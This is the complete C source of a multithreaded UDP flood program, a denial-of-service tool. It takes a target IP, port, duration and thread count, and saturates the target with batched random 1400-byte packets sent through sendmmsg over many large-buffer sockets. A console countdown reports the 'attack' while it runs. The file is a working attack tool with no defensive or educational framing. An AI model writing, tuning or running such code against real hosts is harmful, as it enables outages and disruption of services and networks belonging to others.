#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <sys/uio.h>   // Needed for sendmmsg

// Configuration
#define MAX_PACKET_SIZE 1400
#define MAX_SOCKETS_PER_THREAD 16
#define SOCKET_BUFFER_SIZE (1024 * 1024 * 50) // 50MB
#define MMSG_BATCH 16  // Number of packets to send in one sendmmsg call

typedef struct {
    char *target_ip;
    int target_port;
    volatile int *running;
} AttackParams;

char packet[MAX_PACKET_SIZE];

// Fixed countdown timer (now runs exactly 'duration' seconds)
void display_countdown(int duration) {
    for (int i = duration; i > 0; i--) {
        printf("\rAttack running... Time remaining: %02d:%02d", (i-1)/60, (i-1)%60);
        fflush(stdout);
        sleep(1);
    }
    printf("\rAttack completed!                          \n");
}

void* udp_flood(void *arg) {
    AttackParams *params = (AttackParams*)arg;
    struct sockaddr_in dest_addr;
    int socks[MAX_SOCKETS_PER_THREAD];
    int sock_count = 0;

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest_addr.sin_addr);

    // Create sockets and set reuse options
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, IPPROTO_UDP);
        if (sock >= 0) {
            int opt = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#ifdef SO_REUSEPORT
            setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
            int buf_size = SOCKET_BUFFER_SIZE;
            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
            socks[sock_count++] = sock;
        }
    }

    // Attack loop using sendmmsg() to batch sends for efficiency (thus reducing power consumption)
    while (*params->running) {
        for (int s = 0; s < sock_count; s++) {
            struct mmsghdr msgs[MMSG_BATCH];
            struct iovec iov[MMSG_BATCH];
            memset(msgs, 0, sizeof(msgs));
            for (int j = 0; j < MMSG_BATCH; j++) {
                iov[j].iov_base = packet;
                iov[j].iov_len = MAX_PACKET_SIZE;
                msgs[j].msg_hdr.msg_name = (struct sockaddr *) &dest_addr;
                msgs[j].msg_hdr.msg_namelen = sizeof(dest_addr);
                msgs[j].msg_hdr.msg_iov = &iov[j];
                msgs[j].msg_hdr.msg_iovlen = 1;
            }
            // This call sends MMSG_BATCH packets in one syscall without waiting (MSG_DONTWAIT)
            sendmmsg(socks[s], msgs, MMSG_BATCH, MSG_DONTWAIT);
        }
    }

    // Cleanup
    for (int i = 0; i < sock_count; i++) {
        close(socks[i]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION> [THREADS]\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc > 4) ? atoi(argv[4]) : 4;  // Allows manual thread count

    // Initialize packet with random data
    for (int i = 0; i < MAX_PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }

    volatile int running = 1;
    pthread_t *threads_arr = malloc(threads * sizeof(pthread_t));
    AttackParams *params = calloc(threads, sizeof(AttackParams));

    // Start attack threads
    for (int i = 0; i < threads; i++) {
        params[i].target_ip = ip;
        params[i].target_port = port;
        params[i].running = &running;
        
        if (pthread_create(&threads_arr[i], NULL, udp_flood, &params[i])) {
            perror("Thread creation failed");
            running = 0;
            break;
        }
    }

    // Run countdown timer and stop the attack exactly after 'duration' seconds
    display_countdown(duration);
    running = 0;

    // Cleanup
    for (int i = 0; i < threads; i++) {
        pthread_join(threads_arr[i], NULL);
    }
    free(threads_arr);
    free(params);

    return 0;
}